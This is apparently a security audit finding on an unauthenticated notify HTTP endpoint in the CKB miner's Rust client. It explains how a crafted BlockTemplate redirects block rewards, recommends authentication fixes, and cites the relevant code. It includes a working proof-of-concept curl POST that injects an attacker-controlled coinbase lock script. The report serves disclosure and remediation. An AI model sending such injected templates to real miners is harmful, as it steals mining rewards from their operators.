### Title
Unauthenticated Block Template Injection via Miner Notify HTTP Endpoint — (File: `miner/src/client.rs`)

---

### Summary

The CKB miner's notify-mode HTTP listener accepts `BlockTemplate` updates from any HTTP client with no authentication, IP restriction, or token verification. An attacker who can reach the miner's configured listen port can POST a crafted `BlockTemplate` containing an attacker-controlled coinbase lock script, causing the miner to mine blocks that redirect all block rewards (subsidy + fees) to the attacker's address.

---

### Finding Description

**Root cause:** `miner/src/client.rs`, function `handle` (lines 358–369), and its caller `listen_block_template_notify` (lines 234–271).

When the miner is configured in notify mode (`config.listen` is `Some(addr)`), `spawn_background` starts an HTTP server via `listen_block_template_notify`. Every incoming TCP connection is served by the `handle` function:

```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();

    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);   // ← no auth check
    }

    Ok(Response::new(Empty::new()))
}
```

There is no authentication, no IP allowlist, no shared-secret header, and no HMAC verification. The `parse_authorization` function that exists in the same file is used exclusively for **outgoing** RPC calls (miner → node) and is never consulted for **incoming** notify requests.

`update_block_template` then forwards the attacker-supplied `BlockTemplate` directly to the worker threads as new `Work`:

```rust
fn update_block_template(&self, block_template: BlockTemplate) {
    ...
    let work: Work = block_template.into();
    if let Err(e) = self.new_work_tx.send(Works::New(work)) { ... }
}
```

The only guard inside `update_block_template` is a `work_id` deduplication check, which is trivially bypassed by supplying any `work_id` value that differs from the current one (e.g., `0xFFFFFFFF`).

**Attack flow:**
1. Attacker identifies the miner's notify listen address (e.g., `127.0.0.1:8888` or a public interface).
2. Attacker crafts a `BlockTemplate` JSON with a coinbase `outputs[0].lock` set to the attacker's own lock script.
3. Attacker sends a single HTTP POST to the miner's notify endpoint.
4. `handle` deserializes the template and calls `update_block_template` without any verification.
5. The malicious work is dispatched to worker threads.
6. Workers solve PoW on the attacker's block template and submit it via `submit_block`.
7. All block rewards (CKB subsidy + transaction fees) are paid to the attacker's address.

---

### Impact Explanation

The miner performs all computational work but receives zero reward. Every block mined while the injected template is active transfers the full block subsidy and transaction fees to the attacker. This is a direct, quantifiable theft of mining revenue. The attack persists until the legitimate node sends a new template that overwrites the injected one, but the attacker can continuously re-inject to maintain control.

---

### Likelihood Explanation

- **Notify mode is a documented production feature**, not a debug path. It is described in `resource/ckb.toml` and in the miner's own startup log.
- If the miner's listen address is bound to a non-loopback interface (e.g., `0.0.0.0:8888`), any internet-reachable attacker can exploit this with a single HTTP POST — no credentials, no prior knowledge of the node state.
- Even when bound to `127.0.0.1`, any local process (including malware, a compromised co-located service, or an SSRF vulnerability in another local service) can reach the port and inject a template.
- The `work_id` check is not a security control; it is a deduplication hint that is trivially bypassed.

---

### Recommendation

Add authentication to the miner's incoming notify HTTP handler. Concrete options:

1. **Shared secret token**: Require a configurable `Authorization` header on incoming notify requests; reject requests that do not present the correct token.
2. **Source IP allowlist**: Only accept connections from the IP address of the configured CKB node RPC endpoint; reject all others at the TCP accept stage.
3. **Enforce loopback-only in code**: If the listen address is not a loopback address, emit a hard error at startup rather than silently binding to a potentially public interface.

The fix is analogous to NEAR's `assert_one_yocto()` pattern: add an explicit caller-identity check at the entry point of the privileged function before any state mutation occurs.

---

### Proof of Concept

```bash
# Attacker crafts a BlockTemplate with their own coinbase lock script
# and POSTs it to the miner's notify endpoint (no credentials needed)

curl -s -X POST http://127.0.0.1:8888 \
  -H "Content-Type: application/json" \
  -d '{
    "version": "0x0",
    "compact_target": "0x1e083126",
    "current_time": "0x17e6a5b3c00",
    "number": "0x1",
    "epoch": "0x3e80001000000",
    "parent_hash": "0xd5ac....",
    "cycles_limit": "0x2540be400",
    "bytes_limit": "0x91c08",
    "uncles_count_limit": "0x2",
    "uncles": [],
    "transactions": [],
    "proposals": [],
    "cellbase": {
      "cycles": null,
      "data": {
        "cell_deps": [], "header_deps": [],
        "inputs": [{"previous_output": {"index": "0xffffffff",
          "tx_hash": "0x0000000000000000000000000000000000000000000000000000000000000000"},
          "since": "0x1"}],
        "outputs": [{
          "capacity": "0x12a05f200",
          "lock": {
            "code_hash": "0x9bd7e06f3ecf4be0f2fcd2188b23f1b9fcc88e5d4b65a8637b17723bbda3cce8",
            "hash_type": "type",
            "args": "0xATTACKER_PUBKEY_HASH_HERE"
          },
          "type": null
        }],
        "outputs_data": ["0x"],
        "version": "0x0",
        "witnesses": ["0x..."]
      }
    },
    "work_id": "0xffffffff",
    "dao": "0x..."
  }'
```

After this POST, the miner's worker threads begin solving PoW on the injected template. The next successfully mined block pays all rewards to `ATTACKER_PUBKEY_HASH_HERE`. The legitimate miner receives nothing.

**Relevant code locations:** [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** miner/src/client.rs (L204-232)
```rust
    pub fn spawn_background(self) {
        let client = self.clone();
        if let Some(addr) = self.config.listen {
            ckb_logger::info!("listen notify mode : {}", addr);
            ckb_logger::info!(
                r#"
Please note that ckb-miner runs in notify mode. \
You should configure the corresponding information in CKB block assembler, \
for example:

[block_assembler]
...
notify = ["http://{}"]

Otherwise ckb-miner will malfunction and stop submitting valid blocks after a certain period.
"#,
                addr
            );
            self.handle.spawn(async move {
                client.listen_block_template_notify(addr).await;
            });
            self.blocking_fetch_block_template();
        } else {
            ckb_logger::info!("loop poll mode: interval {}ms", self.config.poll_interval);
            self.handle.spawn(async move {
                client.poll_block_template().await;
            });
        }
    }
```

**File:** miner/src/client.rs (L234-271)
```rust
    async fn listen_block_template_notify(&self, addr: SocketAddr) {
        let listener = TcpListener::bind(addr).await.unwrap();
        let server = auto::Builder::new(TokioExecutor::new());
        let graceful = GracefulShutdown::new();
        let stop_rx: CancellationToken = new_tokio_exit_rx();

        loop {
            let client = self.clone();
            let handle = service_fn(move |req| handle(client.clone(), req));
            tokio::select! {
                conn = listener.accept() => {
                    let (stream, _) = match conn {
                        Ok(conn) => conn,
                        Err(e) => {
                            info!("accept error: {}", e);
                            tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                            continue;
                        }
                    };
                    let stream = hyper_util::rt::TokioIo::new(Box::pin(stream));
                    let conn = server.serve_connection_with_upgrades(stream, handle);

                    let conn = graceful.watch(conn.into_owned());
                    tokio::spawn(async move {
                        if let Err(err) = conn.await {
                            info!("connection error: {}", err);
                        }
                    });
                },
                _ = stop_rx.cancelled() => {
                    info!("Miner client received exit signal. Exit now");
                    break;
                }
            }
        }
        drop(listener);
        graceful.shutdown().await;
    }
```

**File:** miner/src/client.rs (L293-312)
```rust
    fn update_block_template(&self, block_template: BlockTemplate) {
        let work_id = block_template.work_id.into();
        let updated = |id| {
            if id != work_id || id == 0 {
                Some(work_id)
            } else {
                None
            }
        };
        if self
            .current_work_id
            .fetch_update(Ordering::SeqCst, Ordering::SeqCst, updated)
            .is_ok()
        {
            let work: Work = block_template.into();
            if let Err(e) = self.new_work_tx.send(Works::New(work)) {
                error!("notify_new_block error: {:?}", e);
            }
        }
    }
```

**File:** miner/src/client.rs (L358-369)
```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();

    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }

    Ok(Response::new(Empty::new()))
}
```

**File:** miner/src/client.rs (L380-394)
```rust
fn parse_authorization(url: &Uri) -> Option<HeaderValue> {
    let a: Vec<&str> = url.authority()?.as_str().split('@').collect();
    if a.len() >= 2 {
        if a[0].is_empty() {
            return None;
        }
        let mut encoded = "Basic ".to_string();
        base64::prelude::BASE64_STANDARD.encode_string(a[0], &mut encoded);
        let mut header = HeaderValue::from_str(&encoded).unwrap();
        header.set_sensitive(true);
        Some(header)
    } else {
        None
    }
}
```
